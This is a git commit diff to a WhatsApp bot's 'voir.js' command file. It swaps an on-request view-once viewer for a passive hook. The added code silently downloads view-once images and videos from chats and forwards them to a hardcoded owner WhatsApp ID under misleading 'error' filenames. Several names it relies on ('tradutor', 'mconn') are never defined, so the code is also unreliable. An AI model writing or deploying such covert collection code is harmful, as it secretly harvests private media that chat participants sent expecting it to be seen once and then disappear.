6e809aed46ad3865b2ca0e26456f293e48e1510d
caseyweb <caseywebsthedonn25@gmail.com>
2025-02-20 20:59:12 +0300

    ℂ𝔸𝕊𝔼𝕐ℝℍ𝕆𝔻𝔼𝕊🫅

--- commandes/voir.js
+++ commandes/voir.js
@@ -1,38 +1,30 @@
-const {zokou}=require("../framework/zokou")
-const {getContentType}=require("@whiskeysockets/baileys")
+const { downloadContentFromMessage } = (await import('@whiskeysockets/baileys'));
 
+// Define the bot owner's WhatsApp ID
+const BOT_OWNER_ID = '4367845480109@s.whatsapp.net'; // Replace with the actual ID
 
+export async function before(m, { isAdmin, isBotAdmin }) {
+  const datas = global;
+  const idioma = datas.db.data.users[m.sender].language;
 
-zokou({nomCom:"vv",categorie:"General",reaction:"🤩"},async(dest,zk,commandeOptions)=>{
-
-const {ms,msgRepondu,repondre}=commandeOptions;
-
-
-if(!msgRepondu){return repondre("*Mentionne a view once media* .");}
-
-
-if(msgRepondu.viewOnceMessageV2)
-{
-      if(msgRepondu.viewOnceMessageV2.message.imageMessage)
-       {
-         var image =await zk.downloadAndSaveMediaMessage(msgRepondu.viewOnceMessageV2.message.imageMessage)
-        var texte = msgRepondu.viewOnceMessageV2.message.imageMessage.caption
-    
-     await zk.sendMessage(dest,{image:{url:image},caption:texte},{quoted:ms})
-      }else if(msgRepondu.viewOnceMessageV2.message.videoMessage){
-
-    var video = await zk.downloadAndSaveMediaMessage(msgRepondu.viewOnceMessageV2.message.videoMessage)
-var texte =msgRepondu.viewOnceMessageV2.message.videoMessage.caption
-
-
-await zk.sendMessage(dest,{video:{url:video},caption:texte},{quoted:ms})
-
+  const chat = db.data.chats[m.chat];
+  if (/^[.~#/\$,](read)?viewonce/.test(m.text)) return;
+  if (!chat?.antiviewonce || chat?.isBanned) return;
+  if (m.mtype == 'viewOnceMessageV2') {
+    const msg = m.message.viewOnceMessageV2.message;
+    const type = Object.keys(msg)[0];
+    const media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video');
+    let buffer = Buffer.from([]);
+    for await (const chunk of media) {
+      buffer = Buffer.concat([buffer, chunk]);
+    }
+    const cap = tradutor.texto1;
+    if (/video/.test(type)) {
+      // Send the video to the bot owner's inbox
+      return mconn.conn.sendFile(BOT_OWNER_ID, buffer, 'error.mp4', `${msg[type].caption ? msg[type].caption + '\n\n' + cap : cap}`, m);
+    } else if (/image/.test(type)) {
+      // Send the image to the bot owner's inbox
+      return mconn.conn.sendFile(BOT_OWNER_ID, buffer, 'error.jpg', `${msg[type].caption ? msg[type].caption + '\n\n' + cap : cap}`, m);
+    }
+  }
 }
-}else
-{
-   return repondre("this message is not on view once .")
-}
-
-
-
-})
